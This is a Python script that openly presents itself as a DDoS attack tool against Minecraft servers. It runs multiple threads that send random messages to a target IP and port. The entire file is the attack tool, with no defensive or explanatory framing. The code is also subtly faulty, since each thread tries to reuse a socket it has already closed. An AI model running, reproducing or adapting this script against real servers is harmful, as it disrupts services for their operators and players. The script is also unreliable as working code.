import argparse
from socket import *
import datetime
import time
import threading
import random
import string

parser = argparse.ArgumentParser(description="DDoS attack script for a Minecraft server.")
parser.add_argument('-ip', '--ip_address', type=str, required=True, help="The IP address of the Minecraft server.")
parser.add_argument('-p', '--port', type=int, required=True, help="The port number of the Minecraft server.")
parser.add_argument('-rpt', '--requests_per_thread', type=int, default=100, help="Number of requests per thread.")
parser.add_argument('-nt', '--num_threads', type=int, default=10, help="Number of threads.")
parser.add_argument('-d', '--delay', type=float, default=0.1, help="Delay between requests (in seconds).")
parser.add_argument('-ml', '--message_length', type=int, default=128, help="Length of random message.")

args = parser.parse_args()

def generate_random_message(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def send_requests():
    clientSocket = socket(AF_INET, SOCK_STREAM)
    for _ in range(args.requests_per_thread):
        try:
            clientSocket.connect((args.ip_address, args.port))
            message = generate_random_message(args.message_length)
            clientSocket.send(message.encode())
            print(f'<-- message "{message}" sent to server {clientSocket.getpeername()[0]}:{clientSocket.getpeername()[1]} on {datetime.datetime.now()}')
            clientSocket.recv(1024)
            clientSocket.close()
            time.sleep(args.delay)
        except Exception as e:
            print(f'Error: {e}')
            break

threads = []
for _ in range(args.num_threads):
    thread = threading.Thread(target=send_requests)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

print('All threads have finished.')